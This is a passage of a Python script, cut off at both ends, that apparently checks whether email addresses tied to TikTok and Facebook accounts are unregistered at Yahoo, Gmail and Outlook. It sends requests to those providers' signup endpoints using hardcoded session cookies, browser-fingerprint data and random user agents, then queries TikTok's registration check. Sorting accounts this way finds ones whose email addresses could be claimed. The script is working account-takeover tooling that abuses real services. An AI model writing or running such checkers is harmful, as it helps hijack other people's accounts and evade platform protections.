dYdPIpJj18qWQShVerqs1UcsB7Hxh67QTx1d2VqqKH9y044pHa55bjeSRnOkIYdHYv2us5rQSEw_04BBRBPAgbSnWrl9COJvpVTVeMF6ykV1.TJzQCKltU4uRTKiQIKfy9vGJuiKjwjFc7h1V5S9Y8Jd69EaDEb1XCaeOAruPYJqc9MINCeycUQFqhxUoHKUORcK9RV_9EINbPwgiB290jhdk3mEffmVI8a8RCcIpiW5dwUCgMkrBb90ebetwP_I9I5fke_USUYS3KtIsOq7L8APsJ4lCmwOdfAPm9OWyLz20bOdk0CidwpDFrqqxQt2JfUe_oyJB8FdZRfmcGmvjrnZm6blzGzUbFnxxJ.5ydhPjmf345BXcxnS3E.U0emkN4Wc0V.xzM_hkQh.oCeqWzSqf15eHZRSoLUusEUA.31Md9l67W_lNcQ.6nASTIWxr_q0l8jjGSGyiyJY-~A',
}
      	
      	
      	data = f'browser-fp-data=%7B%22language%22%3A%22en-US%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A4%2C%22pixelRatio%22%3A1%2C%22hardwareConcurrency%22%3A4%2C%22timezoneOffset%22%3A420%2C%22timezone%22%3A%22America%2FLos_Angeles%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22openDatabase%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A5%2C%22hash%22%3A%222c14024bf8584c3f7f63f24ea490e812%22%7D%2C%22canvas%22%3A%22canvas%20winding%3Ayes~canvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google%20Inc.%20(Intel)~ANGLE%20(Intel%2C%20Intel(R)%20HD%20Graphics%203000%20Direct3D9Ex%20vs_3_0%20ps_3_0%2C%20igdumd64.dll)%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C%22fonts%22%3A%7B%22count%22%3A33%2C%22hash%22%3A%22edeefd360161b4bf944ac045e41d0b21%22%7D%2C%22audio%22%3A%22124.04347527516074%22%2C%22resolution%22%3A%7B%22w%22%3A%221600%22%2C%22h%22%3A%22900%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22860%22%2C%22h%22%3A%221600%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1657415199200%2C%22render%22%3A1657415200314%7D%7D&specId=yidregsimplified&cacheStored=&crumb=V0Pr4B6tQHi&acrumb=0sHA17fo&done=https%3A%2F%2Fwww.yahoo.com&googleIdToken=&authCode=&attrSetIndex=0&specData=3qiYX%2FHBcI%2F%2BhrvMxYBXgXQb1%2FYAeMSHZmV4MqgmhqN1URqj%2FsjgTGrzl4FYAaAL1UczLgsaT4rm7Cq3BXusOpCF83nfWay%2BC4rhWCth8rBob6OT8S9v0s7KQfuZoeXmPP0NCJxRHjiKlQBmUepkdKTRtym7LERXeBITKc8qTL15f6Vb9O1yc3ZBETBW%2FOpt6%2FNdXvTgPh8z9rX4CcDlWyjVuO2KusJUgIe2sQ%2BSs7EOIYSCVcNUAOqCtXAFkLyS%2FwtNW9ew2r%2BdkiOEmXXi2Akg3YFs3tNskYHR8cTvqHvpf9mEeGwYDCg0%2FGzQybLfG9um3opaS%2Bvnkz19nTE2jfxnlgudhbhKSkg5b4I3WA7tiQh%2BfdpkINdYrPRYXa%2FbQO47iWX9XnSJm536xRWWqrirGNYme3ZP%2FkbEHdsOCRN59fCXf9GEj0GSdIOYs2OI%2FgcOEl%2BQAV3uH0Dg8OZC0Cm9Nrk%2FYJTIntesxVHvpI5qGAYMr8sR47yrUHuZCahwj9T8tJob%2BJh7cKO1rw83V07K4zwiBSzeQyxbKKj%2BoaUK6tDYVCsS0nsPl9YYzNakW4V6hLVHiMlIwrqdSaaqyD%2FpkWwIZon33c6ulzzRogLES4lZi%2B6Y1I34QbnRs1M1%2Blag9xNYAhe2ysOQWsbec5F2vJaYY941UzlAEH5Z2aoCAgUchjmfRvAqwD3J%2FKlAmwATVMjlgwYwiGZb%2Bc6XIyzGV0P4iq%2F0h8mvJaBqloH%2Be8G%2BOApb2ybaGWor1R1RCt5oHPvbi5pcXhv895j3Pf8R%2BzuCxZu%2F2fLWCugzT4auXfUEvQoR9cBsQxKBe%2Fiw6eo78VzExH9qBh2kpEqtjy1LkHzoh24mn%2FTykqvPMu6cOtu0ZNv%2BCQVEXhER%2BLiZmHqtkvc75fUK1ELu4lKpMitRu4%2BnYTf7saiWOVdn2gQgI2p%2FXU7iPBSxwEzabRpoVwb5wUymGZFsloAcLmBz0FuWtkoqfHzmJdQSZY1y%2BJqMKP30vK8Zy9%2F8RVMpvb859VdesnhF%2B%2B1lFWkfCal3tQNR%2FnN%2BScD4A9rDs1alXxvEpGjnXSpCQ569imLxX11pbaozUXipv4%2BG2WrhGGuTulBoeucBhkiTNf3r73WJfwRCCJCEyztLcYbl3x9P6ahKOjGKEdVDnVi4vGIi47A56jVoQn3QoHmahw6PsqlV4dhtd0u%2BYQ0s09rmFGABQjPdQaSddrB0g32WVOBdruFLeevg9bKRkZYOcr1AfWsuIqi6HaDiKCgomeNN0xB77B0lrwLyS6bW5iGTPP6a%2BlokF6YJKoIlh%2B3xVDWZ4%2Bjj3iEViHGJJA4hsLGy%2FN88eRNZ2RVo957EK3%2FE6vu0L4phnMCwMRxx7PVY2d3oHdGfyMpYFnHK1HRhWspF6PbLoz1jewpUPtuUXmA8qtphATgd4GpwugPQJq6L6n1RFRnHd8WrazHf1HxSO1cZObRYDFPwwR1TK4RkS%2FCoHMePTwNFgy85Z%2FDZ3QYKGhQ8himvoLFH9yLpERLhvS7n%2BV%2BXBJhEOUEDqrTgzf87BX2qI5pKB8P1SZelaAgUU3cXMqxo3et1yxlXaeOptj3K6QrZHs%2BjfTWp5rSVCQ7lj%2BFVql1JChhIU7t0E6h0Y73%2Fy%2BSfnUUtLrjySQQD1vHE%2F6eZYQUHUnz7bYj88EVQZ4e8LAYJvh62gYgoHNIHnk%2Bsa18Q3OUVhcCRqaO4XIiUCWXWaMa8TC7OWOicicC7C73mfEapdQoRpacErL5cDj0lVU%2FkSO31BukbIJ3qXArWnB6xHoBG2L%2FJnwURub4U0e65qB3cAnFe1z%2Bu9SIYRQtmEX%2B%2Fb91mI%2F06XMQd3YrYv%2Bod2sTCVHbpiUXe6vR%2FG5edhHiGB53aMuHX1ljEB711okyoJOViTHu1Fuf4pLhvDSZyOeHBqqX5qj%2FsNjoyZGI1o04O%2F2u%2Bo%2BJMy5YvVVRd8ALRgcpOkqdG9KuT00t1b7R5J5TKKxwUbqMKnkUHGbHi3hA9rHD6Kqn7nfFNvzLmFvA7aN4mFbGy8SncJ9O6MBofHhFnPkhC%2FZdxkYtjDAtSRE9AVNvxEbbGHhqhKBJFaDn%2F2zbK1OqAyC1Wy7rjD7bzYZT3RFKprvz4Dp1SZO732C6%2BcEStFzKt1hK%2FzXDidbZz6bgRhasGBzT2m5ty1F8Y9VCUeIcDbhzkcsztEsqjTbgF1VHJvuxAPo14nDI%2FCHcGCOX7aHSXH4U7G0YFH7O09NruPxcR40KCfO%2FF8eQ%2Bd4ovBGb1SW%2F4wcJ9pWzPKS4XUQ5xSlitdekid5nyDTSEIODfW2vLufF9Da%2BFuj87kH0TtBcM0SR7d5XfYAMA1OOmzOt35LCJGFgF%2F3xyLZv1ghZT%2Bx28qC8fZ7V%2FVnH3uYrVM1S%2FIN71UZRS%2FUK6Cq9bVLrRfGSRqAYlpSalBB8squ%2BsGQ%2FrhLtu6J29Ttg0N1wHovjPX9kPgqsVCcYTIrUE0PcZDw%2BGd5EUiyBNF6HZ4oAMafvj5snS9gLIhIcG82aEhwIfiBR9Rwm%2F%2F7hGq5REIesblFcPIszNvXHr8Prb4xetLLmTYlLxHa9FhoiUG3HxbTJFxSPdc03x9h0665awOppQ4YxAQHjcxOrrzjxhrcZH2TL7DAJZS7F%2FpQae11m00SYVMbufIUT5rCqGf1Kc1zLEbVbEksEgsJ3I3xsjexEUPD9tuDOA5KzqfKBGG3jNbuSrfVcVgk6s9bsGRifmYPbk5ahcXu3c7ekuPG72VDVSaS9kpIFMyVDzQV%2F%2BFdK1vIC48pyZXyVNStS6KxQbKj8CkexdqxJwlV1JpRL8sFYb6o0L%2FMJNL%2B2GMVToSJXCqiM0BaBfvBIae2dIhs2tvZlui7IIUdUAQkwAMjjL9LN%2BvIgdoVtCupTMD3TUqTDfU1Cg0C3K98xi5mfeGP6JJwoSlztXIGDuM4EL%2FnSthWs9gniCkxA36e%2F6zW%2FioH0BKVMFanLjjBRUbaKSdVxtQiJYZ6wiYGJhm%2BTGCPMQG2JLlDj4bJeiNCe8wFzDEDUSL8Q65FLSCcZc9UQBxzSSpeIzCSFT4sY%2Fy61Nr%2BgPgBC36PGOx7M0rPPeeU1ePluevsUiXMhcAl7eayJnr5tG1iqRa%2FFSf5jhEaWM7eC10Ey7iAiNDvtxzoSFRqjnEAADD%2FPzhUmcBJdowhE4Y4YBRB81pIgWFgbuhD31Cnfl93n1UBSPEdvR%2B9acYSeFhLoJFkYIjDzwxi9sjp8ik9wUwk70ff9aJRrkfQRWDliWDaJA2um0X%2FYxazTvk6UYJ9du01kePKT%2BUs8fpulOJhEUi2U02ZyqVwpgeoQmdGrztvt9v7U5vICRNpXm3sdcx8bfkvFMRGsUoxPM%2Fxnla9yal2ZtkWPOltctM%2FmdkJtlBvHjffRBOV9CRHP0b7fIZAGFFh2qQbvkRrf53cQQG3OIM5d5AdtiC7769vQ1uKtciUcAmngVpQfMqXBdSgSA5xG1nKfxyZO9oTGIGlf5xJ9lCdoQdLuyJlR6ma5ro29HzqO%2FelrWrajXYFRMqb0jfbMTZiV0hyZpb8Whu6r5KEQ4i2iyZXrMu%2FKXN1LntbdD8%2BHRBQITCt3hvqkk0D%2BU8e1LGceaHsUyVOKx3KN%2FeH3iUAYX4LhP7QKylegSCMX8ujZMyQarDnJmUhdtdVTpqZuskfC3U%2BFuqcV1ueLwy7i7nwlnJR916wpBEKzJxuu5W4XY1xl295AAkrqQ1w3dQD3Y1RmzbHptQooybc87d4P%2BP48djTkXjk5%2BtzQza31zuVMYeXCEOveFDLjhCWJ%2FEfVo4om0PcaQMJ8rIJcwRPbBCHJHPny%2Bp5IjImeGDscr7NZfj6Rxs9a7BzbRv6sSZitlQrzasw8T5XHIglPVLX9qT1uvUhey%2FETHBTZS%2Fy4CyfIwCBgi7TV4L%2FY0D49DyWNvf9TUP4f%2FxP7fPw0MbUkf16e8fzUE2tkvkeeoYzyXkU5Oe9JSS6c2Jfwo%2FFRTB5K75JNwdog8sebO1NyXRVjJlaoS4SgnVJk5Aix2NUPMcIJU5MmYji0gKu1A6QSODbRtXhmvyd8b1FwRv1MWCSmUHfbkZYxLE6GDO24gaYyrwp0h7ahYC55bti4QrVpPDCcGEj7cUBtzUcLMT2MJOXsfjsAbRsRxBW%2BeMOpMhdnEDTFkNIbUPsmzzrMaUu7Y%2BUAfap639tZUe%2FbNqgibgye2KhlXPS%2FTGtxUGsDZqVBCW03N%2FWahUWhtLKp7KJnutk9otzkZ07VHReV1x3fblTYgS59RSPXwUGY97wQCpSbCFpL7xISbzM0SoAegHDQYy09MtD1vfhfDeEZHyR%2FFCt0YLWvIRVoA8A2K5xWUMmPrd657A2gGKeT0%2FthL%2FZpHTSOLLd5RA9VTKXNVu3xE%2FF0OKQ1HTp4p35M4FJV6eheJOiPgcU1BMuZKMXCXf7x0bpCevEXIeSYaD8pQJHLPXyCj%2BpWzjzNdBhOjbtSdloonEyHvrm19UB10QxDR%2B2fMLKJIDKQJtgYFjQhXGUxGpEmPTQ0uekJZ48ej2Gji1tqWlseMOMipg0S1Rgta7MWQQ3EL88J7u9PJf9soLTOaf7Pqqs%2BobulcEsjxv9aPwILr15ZMfdspWg%2Btx8%2BN5b%2B0uYMSwh%2FOdeMCHS8DONFUKN%2BI8ln3tV0kFaqPNNdHTbwJzbPv1a0Y7v%2FCaqPOoAqXPwpUxmI%2FzgQtCgJ91Raj%2F%2BPNzxDn6JxE7nUIo1X%2BjUwerAkQ2Dygy8Fho%2Bw1BYfihj03CZhjS1krj8Vd04aQabeKSZVzdjfCdpkfzwFHfi77iq6vKPHsQmsZadPFf6aXVazYE6SrXj4RRbaoBsW%2BtJ9PGpu3En9CgvKk9JrArFBq4qRM56H2C%2FwIoUQxYEFQgxiB9RYZMF1ZHmTluTqYOak6GO%2Fw7D%2FZjhBWtnBlpTbMafcrExzCy0YuUklTs5v3gQ6uMdvpWo60FlSd4TBhgRu%2BoyOMzxC2U7swA8JqWlfnvrlX0NmrSYKNHzloPAfpXINg7IR4%2BP2vdHHyEu%2FdymeKI4b3cS8fEDC%2BIr4D%2BfXa1edNyqPdFIFmvKGZeVRDuIXNXM%2BjZLLAD7R8Pw%2FRXC5X%2FgGXX01HU4Ma7vPcIcoUY0HpYRohxZHbuvlCxlbj6MMteOXJJPtgiN7z%2BjC6eyognmaE%2BWWeg4uemCw8mw0Ld2mKorywvWbu4DvOBaXuivqtDfkH5b%2BQstz493hTZ5ovVuAssLygF6US%2FFabYr3KxoyEjmhYpvsA45wctYfcjmFwdf1QT2wQz%2FOoskWn1fCsGKCU6OCb%2BHBCQa5KCSN5y%2FNpOWXUIyB3Z5jQXrs3%2F%2BcWGRkm6fDXJHiASkDuhaJuhg%2BHXaFPTGouoi%2BDpseLIE6QDjIhgVsm2WKIlTJfAekOEQMW8IPzFjABJrdWgZg08BqHIwFTSoMgz6DCT3xP%2BpCZE9xkzXCsPKgtvjqAyVrc8rQWvC2XznQYahjmw%2FTPz10lDVAlH41I8XP132BqPUv5jy3tmjQTFeIkbfH%2BQoe2HN4rHa07AwLHP6Y0gDQqIkbY4lPUoHNPeS6jVXnb6d%2FGFRl8tTKg4QCEaZX3lwzjjXXVAlmz%2BZ0wc1jGXRclTPTNnR%2BvklAjqPIypAz%2BR9tx4rLe5jHLXuCy0LHuIdb5OLrCF%2Fgr1MCywGJHpNao4oeukqk6OPPtFN8eYplJy8tnNwoJSsoNrXR1iNFIt%2F3VZRtgOQvrGQ7x0AXwvVqX6Vt%2BYzQ3WWQdu%2BBI9CsFPE7IX4Ek1ZJ97r1%2BREvommgXkRii4pYbZPEGbkgVMcI42x94LtVEM2ZXqsJyAaQY9rX7bsSAahgp3udxAGzoa%2FjTs6tW1oD6sBin1kcjElZbkBI80DCV2rka9LDImH9ZM7NDDU6leamdb2oJCAmB1YMXozgIV5kpMgbVr1%2BdAPuJX3lKyk9kWI9VrBCtmMo%3D%7CjUP9j77GikcMDQ84gY3nfg%3D%3D%7CIM7sEaFvNp%2BZ6Fsp6b915A%3D%3D&tos0=oath_freereg%7Cxa%7Cen-JO&firstName=&lastName=&userid-domain=yahoo&userId={email}&password=&birthYear=&signup='
      	p = {'validateField': 'userId',}
      	response = requests.post('https://login.yahoo.com/account/module/create', params=p,cookies=cook,headers=headers, data=data).text
      	if 'userId' in response:
      		return 'bad'
      	
      	
      	else:
      		
      		coder = "https://www.tiktok.com/passport/web/user/check_email_registered?shark_extra=%7B%22aid%22%3A1459%2C%22app_name%22%3A%22Tik_Tok_Login%22%2C%22app_language%22%3A%22en%22%2C%22device_platform%22%3A%22web_mobile%22%2C%22region%22%3A%22SA%22%2C%22os%22%3A%22ios%22%2C%22referer%22%3A%22https%3A%2F%2Fwww.tiktok.com%2Fprofile%22%2C%22root_referer%22%3A%22https%3A%2F%2Fwww.google.com%22%2C%22cookie_enabled%22%3Atrue%2C%22screen_width%22%3A390%2C%22screen_height%22%3A844%2C%22browser_language%22%3A%22en-us%22%2C%22browser_platform%22%3A%22iPhone%22%2C%22browser_name%22%3A%22Mozilla%22%2C%22browser_version%22%3A%225.0%20%28iPhone%3B%20CPU%20iPhone%20OS%2014_4%20like%20Mac%20OS%20X%29%20AppleWebKit%2F605.1.15%20%28KHTML%2C%20like%20Gecko%29%20Version%2F14.0.3%20Mobile%2F15E148%20Safari%2F604.1%22%2C%22browser_online%22%3Atrue%2C%22timezone_name%22%3A%22Asia%2FRiyadh%22%2C%22is_page_visible%22%3Atrue%2C%22focus_state%22%3Atrue%2C%22is_fullscreen%22%3Afalse%2C%22history_len%22%3A17%2C%22battery_info%22%3A%7B%7D%7D&msToken=vPgBDLGXZNEf56bl_V4J6muu5nAYCQi5dA6zj49IuWrw2DwDUZELsX2wz2_2ZYtzkbUF9UyblyjQTsIDI5cclvJQ6sZA-lHqzKS1gLIJD9M6LDBgII0nxKqCfwwVstZxhpppXA==&X-Bogus=DFSzsIVLC8A-dJf6SXgssmuyRsO1&_signature=_02B4Z6wo00001dTdX3QAAIDBDn9.7WbolA3U3FvAABfU8c"
      		data = f"email={email}&aid=1459&language=en&account_sdk_source=web&region=SA"
      		hed = {
				"User-Agent": generate_user_agent()}
      		r = requests.post(coder,headers=hed,data=data)
      		if '{"is_registered":1}' in r.text:
      			return 'done'
      		elif '{"is_registered":0}' in r.text:
      			return 'email_good'
      		else:
      			return 'block'
		
      		
      
      
      
      
      
      
      
      
     
      
      
      
      if domen == '@gmail.com':
          url = 'https://android.clients.google.com/setup/checkavail'
          headers = {
				'Content-Length': '98',
        'Content-Type': 'text/plain; charset=UTF-8',
        'Host': 'android.clients.google.com',
        'Connection': 'Keep-Alive',
        'user-agent': 'GoogleLoginService/1.3(m0 JSS15J)',}
          data = json.dumps({
	          'username': email,
	          'version': '3',
	          'firstName': '3mk',
	          'lastName': 'Coder' })
          res = requests.post(url, data=data, headers=headers).json()['status']
          if res == 'SUCCESS':
            coder = "https://www.tiktok.com/passport/web/user/check_email_registered?shark_extra=%7B%22aid%22%3A1459%2C%22app_name%22%3A%22Tik_Tok_Login%22%2C%22app_language%22%3A%22en%22%2C%22device_platform%22%3A%22web_mobile%22%2C%22region%22%3A%22SA%22%2C%22os%22%3A%22ios%22%2C%22referer%22%3A%22https%3A%2F%2Fwww.tiktok.com%2Fprofile%22%2C%22root_referer%22%3A%22https%3A%2F%2Fwww.google.com%22%2C%22cookie_enabled%22%3Atrue%2C%22screen_width%22%3A390%2C%22screen_height%22%3A844%2C%22browser_language%22%3A%22en-us%22%2C%22browser_platform%22%3A%22iPhone%22%2C%22browser_name%22%3A%22Mozilla%22%2C%22browser_version%22%3A%225.0%20%28iPhone%3B%20CPU%20iPhone%20OS%2014_4%20like%20Mac%20OS%20X%29%20AppleWebKit%2F605.1.15%20%28KHTML%2C%20like%20Gecko%29%20Version%2F14.0.3%20Mobile%2F15E148%20Safari%2F604.1%22%2C%22browser_online%22%3Atrue%2C%22timezone_name%22%3A%22Asia%2FRiyadh%22%2C%22is_page_visible%22%3Atrue%2C%22focus_state%22%3Atrue%2C%22is_fullscreen%22%3Afalse%2C%22history_len%22%3A17%2C%22battery_info%22%3A%7B%7D%7D&msToken=vPgBDLGXZNEf56bl_V4J6muu5nAYCQi5dA6zj49IuWrw2DwDUZELsX2wz2_2ZYtzkbUF9UyblyjQTsIDI5cclvJQ6sZA-lHqzKS1gLIJD9M6LDBgII0nxKqCfwwVstZxhpppXA==&X-Bogus=DFSzsIVLC8A-dJf6SXgssmuyRsO1&_signature=_02B4Z6wo00001dTdX3QAAIDBDn9.7WbolA3U3FvAABfU8c"
            data = f"email={email}&aid=1459&language=en&account_sdk_source=web&region=SA"
            hed = {
				"User-Agent": generate_user_agent()}
            r = requests.post(coder,headers=hed,data=data)
            if '{"is_registered":1}' in r.text:
              return 'done'
            elif '{"is_registered":0}' in r.text:
              return 'email_good'
            else:
              return 'block'
          else:
            return 'bad'
        
        
        
        
        
       
      
      
      
      
      
      
      
      elif domen == '@hotmail.com' or domen == '@outlook.com':
      	url = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + email + "&_=1604288577990"
      	data = ''
      	headers = {
	"Accept": "*/*",
	"Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
    "Connection": "close",
    "Host": "odc.officeapps.live.com",
    "Accept-Encoding": "gzip, deflate",
    "Referer": "https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0",
    "Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
    "canary": "BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c",
    "uaid": "d06e1498e7ed4def9078bd46883f187b",
    "Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"}
      	html = requests.get(url, data=data, headers=headers).text
      	if 'Neither' in html:
           coder = "https://www.tiktok.com/passport/web/user/check_email_registered?shark_extra=%7B%22aid%22%3A1459%2C%22app_name%22%3A%22Tik_Tok_Login%22%2C%22app_language%22%3A%22en%22%2C%22device_platform%22%3A%22web_mobile%22%2C%22region%22%3A%22SA%22%2C%22os%22%3A%22ios%22%2C%22referer%22%3A%22https%3A%2F%2Fwww.tiktok.com%2Fprofile%22%2C%22root_referer%22%3A%22https%3A%2F%2Fwww.google.com%22%2C%22cookie_enabled%22%3Atrue%2C%22screen_width%22%3A390%2C%22screen_height%22%3A844%2C%22browser_language%22%3A%22en-us%22%2C%22browser_platform%22%3A%22iPhone%22%2C%22browser_name%22%3A%22Mozilla%22%2C%22browser_version%22%3A%225.0%20%28iPhone%3B%20CPU%20iPhone%20OS%2014_4%20like%20Mac%20OS%20X%29%20AppleWebKit%2F605.1.15%20%28KHTML%2C%20like%20Gecko%29%20Version%2F14.0.3%20Mobile%2F15E148%20Safari%2F604.1%22%2C%22browser_online%22%3Atrue%2C%22timezone_name%22%3A%22Asia%2FRiyadh%22%2C%22is_page_visible%22%3Atrue%2C%22focus_state%22%3Atrue%2C%22is_fullscreen%22%3Afalse%2C%22history_len%22%3A17%2C%22battery_info%22%3A%7B%7D%7D&msToken=vPgBDLGXZNEf56bl_V4J6muu5nAYCQi5dA6zj49IuWrw2DwDUZELsX2wz2_2ZYtzkbUF9UyblyjQTsIDI5cclvJQ6sZA-lHqzKS1gLIJD9M6LDBgII0nxKqCfwwVstZxhpppXA==&X-Bogus=DFSzsIVLC8A-dJf6SXgssmuyRsO1&_signature=_02B4Z6wo00001dTdX3QAAIDBDn9.7WbolA3U3FvAABfU8c"
           data = f"email={email}&aid=1459&language=en&account_sdk_source=web&region=SA"
           hed = {
				"User-Agent": generate_user_agent()}
           r = requests.post(coder,headers=hed,data=data)
           if '{"is_registered":1}' in r.text:
             return 'done'
             
           elif '{"is_registered":0}' in r.text:
             return 'email_good'
           else:
             return 'block'
      	else:
      		return 'bad'






















def facebook(email,domen):
      global bad,done,block
      
      
      if domen == '@yahoo.com':
      	headers = {
			'authority': 'login.yahoo.com',
		  'accept': '*/*',
		  'accept-language': 'en-US,en;q=0.9',
		  'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'origin': 'https://login.yahoo.com',
      'referer': 'https://login.yahoo.com/account/module/create?intl=xa&specId=yidregsimplified&context=reg&done=https%3A%2F%2Fwww.yahoo.com',
      'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
      'x-requested-with': 'XMLHttpRequest',
}
      	cook = {
			'A3': 'd=AQABBCLFxGICENehR8BnUi6pQUzqCTsE5goFEgEBAQEWxmLOYgAAAAAA_eMAAA&S=AQAAAhjVtyai82Rrxg2CK5FMdUc',
		  'A1': 'd=AQABBCLFxGICENehR8BnUi6pQUzqCTsE5goFEgEBAQEWxmLOYgAAAAAA_eMAAA&S=AQAAAhjVtyai82Rrxg2CK5FMdUc',
		  'A1S': 'd=AQABBCLFxGICENehR8BnUi6pQUzqCTsE5goFEgEBAQEWxmLOYgAAAAAA_eMAAA&S=AQAAAhjVtyai82Rrxg2CK5FMdUc&j=WORLD',
		  'AS': 'v=1&s=0sHA17fo&d=A62cb7327|5xRp8pr.2UJmOAqR8uAJglbFObbsH8uOznbuKM00ySlD8Ha.X4jNUXo4VEjGrKs97pN8kPAqzIf1jQcTQp5veb991hp7CXQa18n8eMvtp0i3TKdzY_snYqc41YJj1lVf5YXbOhZFbUgbZ2.BI5VJuQoxc9BfU6gFuHcokkx86DndLRGqMpFyzmFeAViTx6LSbPs2soSDVxJyEtCeBln32VP6QDigRPlUzpL8mrluwSF4NXjjJg3kpS308GYePy96Pznh3CvVja7A0RUIQanRzwQWoKX7u3c5Kgak5jZEasYEQHnqWNCzZXZn5j7BKRKruJ3nhcjBB0BD7YCmViG7NYR1QnbCOntbcWVTvhgr3v7fYIg5cx93ChX3TrMiqfnj.h35U2rNdLWlilATg3BEysTnYSjSIsKcQYnA4C9vzP8Db7tHidwbS1cCjttg.aOyemeymvsE2Y_FsfkK4Qeqx6b0cwqrM7IqzCp0vQp5I_87QmIk8boy4dYeyswIGcdnkLJb45mKMh3DsI5vMN7xyTRhJYO7JVMisaK0Zw8EyrG8z8hCgnozUBv3LpyJjxqbGQGcNBkvn7lhWZgLvsNoBUgVaTEYw5UC0aG7QCh2U7KF9qvv9O0CMZor7aubtx3Z.7SKZVAo7f1yPc4huhhlghkzbNn4BQBL0Fx0dEjQ3Df54gjiOVp5AcJlGM9qlkjbIMDQlg2n_LDedAwQgRoyvPxyrP.Tvqua0OFVi_LUaamtbNsS1SgmJTKobw2K3R39VKy9gcA0vieC9MvgkXQI._E_vz1BtEav0E6RsD2cD.k9j0Jw2brizvfy1wfr6vWoC1bqTMwiEzNGjsX0ug9Yf.yzteWwiWeIAbBG5aSyw9r4O_D9AIig62YIj6y5ERN1msWLRSFv3Dj.ExQ2ek7xuSeN7qW5EIh.4Pnvbm1WNv1TXVuw23WA7HV7WtEiOkfFDs5DvjhLX4MIU_Bt.gpZAcg89Yg-~A|B62cb779f|5f1yTBf.2Tq2W7LQ3KsSFbticESMze16y.0N0bOBd_EFQ_q1.moN9y.T_Vf0mwzJRub.9SzesA7Pzge4dwE_n84Jwg31ipQlUd7uIpky29J0EB2spihP_9ukbwI3MhWdMnds18q42N5ajt9kgn10vdAx5Fp9sNFAbXVl0op1I9bNGrfuz_4_P.a8Eoak702B2ebotX0YdNYct.IJ66Qfd8D.3g1ymlmnHxr7Y2IwJYCg15oQyQBeF8Z7DNW8_kZrP1s6dSZpd75ZI6wro_Rwh2ubvUely.oxpRFUTM2Vlh_VxnvDBDkBPaUC6OO0POVyPIbbCYKUWCVKcMQ_iVYhT.Nh0hntrcppxtz4BVp0rB6jAeb8nc0CrwSFRXP4uo8ICcsK22LsRqH7GWqqpQgrgZC51xJoFGph.Z4ZIX8fMu80u4Eh7lVx4emSGoO3UfrvvkL1RFWxHBfnSxeTmc3dYdPIpJj18qWQShVerqs1UcsB7Hxh67QTx1d2VqqKH9y044pHa55bjeSRnOkIYdHYv2us5rQSEw_04BBRBPAgbSnWrl9COJvpVTVeMF6ykV1.TJzQCKltU4uRTKiQIKfy9vGJuiKjwjFc7h1V5S9Y8Jd69EaDEb1XCaeOAruPYJqc9MINCeycUQFqhxUoHKUORcK9RV_9EINbPwgiB290jhdk3mEffmVI8a8RCcIpiW5dwUCgMkrBb90ebetwP_I9I5fke_USUYS3KtIsOq7L8APsJ4lCmwOdfAPm9OWyLz20bOdk0CidwpDFrqqxQt2JfUe_oyJB8FdZRfmcGmvjrnZm6blzGzUbFnxxJ.5ydhPjmf345BXcxnS3E.U0emkN4Wc0V.xzM_hkQh.oCeqWzSqf15eHZRSoLUusEUA.31Md9l67W_lNcQ.6nASTIWxr_q0l8jjGSGyiyJY-~A',
}
      	
      	
      	data = f'browser-fp-data=%7B%22language%22%3A%22en-US%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A4%2C%22pixelRatio%22%3A1%2C%22hardwareConcurrency%22%3A4%2C%22timezoneOffset%22%3A420%2C%22timezone%22%3A%22America%2FLos_Angeles%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22openDatabase%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A5%2C%22hash%22%3A%222c14024bf8584c3f7f63f24ea490e812%22%7D%2C%22canvas%22%3A%22canvas%20winding%3Ayes~canvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google%20Inc.%20(Intel)~ANGLE%20(Intel%2C%20Intel(R)%20HD%20Graphics%203000%20Direct3D9Ex%20vs_3_0%20ps_3_0%2C%20igdumd64.dll)%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%2